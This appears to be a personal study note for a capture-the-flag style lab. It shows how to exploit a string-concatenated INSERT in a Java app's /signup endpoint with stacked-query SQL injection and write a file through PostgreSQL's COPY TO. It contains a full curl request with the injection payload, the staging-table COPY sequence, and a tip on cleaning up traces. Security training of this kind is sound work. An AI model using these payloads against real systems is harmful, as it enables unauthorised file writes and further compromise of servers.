---
tags: [lab, attack/web]
module: advanced_sql_injections
last_updated: 2026-05-22
---

# Lab: Reading and Writing Files

Target: BlueBird application on port 8080. Requires the decompiled source from [[labs/htb/advanced_sql_injections/decompiling_java_archives]].

This lab exploits an unsafe INSERT in `POST /signup` to write a file on the server via PostgreSQL's `COPY TO` command. All steps are CLI-based using curl.

## Tool Installation

```bash
curl --version || sudo apt install curl -y
```

---

## Question 1 — Write a file via signup SQLi and retrieve the flag from `/server-info`

**Goal:** Exploit the unsafe INSERT in `POST /signup` to create `/var/lib/postgresql/proof.txt` on the server, then check `GET /server-info` for the flag.

### Step 1 — Confirm the injection point and its capabilities

**What makes this injection point different from the others:** Earlier labs focused on reading data out of the database. This one escalates to writing files to the OS filesystem. The prerequisite is two things happening together: a stacked-query injection (ability to run multiple SQL statements) AND the PostgreSQL user having file-write permission.

**From source review of `signupPOST()` in `AuthController.java`:** Three SQL queries run during signup. The first two are parameterized prepared statements (safe). The third is a direct string concatenation INSERT:

```sql
INSERT INTO users (name, username, email, password) VALUES ('<name>', '<username>', '<email>', '<password>')
```

The `name` parameter is the first value in the INSERT. If you inject through `name`, you can close the INSERT early and append additional SQL statements — a stacked query attack.

**Why use the `name` parameter specifically:** It's the first positional value. Closing it with a `'` and then a `)` allows you to complete the INSERT with dummy values for the remaining columns, then `;` to end the statement and begin a new one. You can't do this as cleanly from the middle columns because you'd need to match the remaining positional values precisely.

### Step 2 — Assess whether COPY TO will work

**What determines if COPY TO is available:** PostgreSQL's `COPY ... TO file` requires either superuser privileges or the `pg_write_server_files` role. Before building a payload, you want to assess whether the database user (visible in the logs as `bbuser`) has these privileges.

**In a real engagement**, you'd check this via:
```bash
# If you have direct psql access
psql -h <TARGET> -U bbuser -c "SELECT current_setting('is_superuser');"
# or
psql -h <TARGET> -U bbuser -c "\du bbuser"
```

**In this lab**, the question specifically tells you to write to `/var/lib/postgresql/proof.txt` — inside PostgreSQL's own data directory. The PostgreSQL OS process always has write access to its own data directory, and the lab is designed so the DB user has sufficient privileges. If COPY failed, you'd fall back to the Large Objects method (see alternative section below).

**Why `/var/lib/postgresql/` specifically:** You need a path the `postgres` OS user can write to. The PostgreSQL data directory is always writable by that user. Writing to `/tmp/` also works. Writing to web application directories (like `/var/www/`) would require the web server and database to run as the same OS user, which is usually not the case.

### Step 3 — Design the injection payload

**The structural challenge:** You're injecting through the `name` field of a multi-value INSERT. A naive `' OR 1=1--` would fail because closing the string with `'` leaves the rest of the INSERT (`', '<username>', '<email>', '<password>')`) dangling in the query, causing a syntax error.

The solution is to complete the INSERT properly with dummy values, then add your SQL after it:

```sql
Life', 'Short', 'Art@art.art', 'Long'); <YOUR SQL HERE>; --
```

Breaking down why each part is needed:
- `Life'` — closes the `name` value
- `, 'Short', 'Art@art.art', 'Long')` — provides valid dummy values for `username`, `email`, `password` so the INSERT is syntactically complete
- `;` — ends the INSERT statement, beginning a new SQL statement
- `<YOUR SQL HERE>` — the file-write payload
- `;--` — ends your payload and comments out any remaining original query text

**The file-write sequence:** PostgreSQL's COPY requires an existing table to copy from. The sequence is: create a staging table → insert the content → COPY the table to a file → drop the staging table.

```sql
CREATE TABLE dbBackups(backup TEXT);
INSERT INTO dbBackups VALUES('Life is short, art Long');
COPY dbBackups TO '/var/lib/postgresql/proof.txt';
DROP TABLE dbBackups;
```

**Why create a temp table instead of using COPY directly:** `COPY ... TO file` copies a table or query result — you can't directly specify a string literal. You need a table with data in it. The staging table approach is the standard workaround.

**Alternative — Large Objects:** If COPY is unavailable (e.g., insufficient privileges), PostgreSQL's Large Objects API (`lo_create`, `lo_put`, `lo_export`) can write files. This is covered in [[labs/htb/advanced_sql_injections/skills_assessment]]. For this lab, COPY is simpler.

### Step 4 — Send the request

```bash
curl -s -X POST "http://<TARGET_IP>:8080/signup" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name=Life', 'Short', 'Art@art.art', 'Long'); CREATE TABLE dbBackups(backup TEXT);INSERT INTO dbBackups VALUES('Life is short, art Long');COPY dbBackups TO '/var/lib/postgresql/proof.txt';DROP TABLE dbBackups; --" \
  --data-urlencode "username=anyuser123" \
  --data-urlencode "email=any@test.com" \
  --data-urlencode "password=anypassword"
```

**What success looks like:** The application may return a normal signup response or redirect to login — the COPY happens server-side without any visible output to the user. Unlike SELECT-based SQLi, file operations don't return data in the HTTP response. If the request completes without a server error, assume the write succeeded.

**What failure looks like:** An HTTP 500 or stack trace containing a PostgreSQL error. Common failure modes:
- Table `dbBackups` already exists (from a previous failed attempt) — add `DROP TABLE IF EXISTS dbBackups;` before the CREATE
- Insufficient privileges for COPY — try the Large Objects method
- Invalid file path — PostgreSQL will refuse paths it can't write to

### Step 5 — Retrieve the flag

```bash
curl -s "http://<TARGET_IP>:8080/server-info"
```

The `/server-info` endpoint reads and displays the contents of `/var/lib/postgresql/proof.txt`. The flag value appears in the response body.

**Why this endpoint exists in the lab:** It provides a convenient out-of-band confirmation that the write succeeded. In a real engagement, you'd confirm a file write by reading the file back via a subsequent SELECT (using `COPY FROM` or Large Object read), or by checking it over SSH if you have server access.

---

## Lessons Learned

- Stacked queries (multiple statements separated by `;`) are possible through JDBC when the application uses `Statement.execute()` instead of `PreparedStatement` — source review reveals which
- COPY TO requires superuser or `pg_write_server_files`; check the DB user's privileges before building the payload
- The `postgres` OS user always has write access to the PostgreSQL data directory — it's a reliable target path even when `/var/www/` or other directories are restricted
- Always clean up temp tables in the same payload — a leftover `dbBackups` table is an indicator of compromise and will cause errors on retry

## Related Pages

- [[attack/web/postgresql_file_read_write]] — COPY FROM/TO and Large Objects reference
- [[attack/web/postgresql_rce]] — escalating file write to command execution
- [[attack/web/white_box_sqli_methodology]] — locating the unsafe INSERT via source review
